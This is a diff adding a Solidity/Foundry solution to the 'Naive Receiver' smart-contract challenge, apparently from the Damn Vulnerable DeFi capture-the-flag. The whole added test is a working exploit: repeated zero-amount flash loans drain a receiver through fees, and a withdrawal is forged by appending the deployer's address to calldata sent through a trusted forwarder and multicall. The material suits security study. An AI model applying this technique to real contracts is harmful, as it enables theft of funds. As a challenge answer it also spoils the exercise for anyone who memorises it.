@@ -77,7 +77,60 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Prepare call data for 10 flash loans and 1 withdrawal
+        bytes[] memory callDatas = new bytes[](11);
+
+        // 1. Drain the FlashLoanReceiver contract by triggering 10 flash loans
+        // Each flash loan costs a fixed 1 WETH fee, regardless of the borrowed amount
+        for (uint i = 0; i < 10; i++) {
+            callDatas[i] = abi.encodeCall(
+                pool.flashLoan,
+                (receiver, address(weth), 0, "0x")
+            );
+        }
+        // At this point, the 10 flash loans will drain the 10 WETH from the receiver
+        // and credit the deployer with 10 WETH in fees in the pool
+
+        // 2. Exploit the vulnerability in the _msgSender() mechanism for the withdrawal
+        // By adding the deployer's address at the end of the call data,
+        // we force the pool to interpret this call as coming from the deployer
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(
+                pool.withdraw,
+                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+            ),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        // Combine all calls into a single transaction via multicall
+        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
+
+        // 3. Create a request for the forwarder
+        // This request will be validated by the forwarder through our signature
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player, // The actual sender is the player
+            target: address(pool), // The target is the pool
+            value: 0, // No ETH sent
+            gas: gasleft(),
+            nonce: forwarder.nonces(player), // Current nonce of the player in the forwarder
+            data: multicallData, // The multicall data to execute all our calls
+            deadline: block.timestamp + 3600 // Valid for one hour
+        });
+
+        // 4. Sign the request to prove we are indeed the player
+        // Calculate the hash to sign according to EIP-712
+        bytes32 dataHash = forwarder.getDataHash(request);
+        bytes32 digest = keccak256(
+            abi.encodePacked("\x19\x01", forwarder.domainSeparator(), dataHash)
+        );
+
+        // Sign the hash with the player's private key
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // 5. Execute the request via the forwarder
+        // This will trigger all our calls in a single transaction
+        forwarder.execute(request, signature);
     }
 
     /**
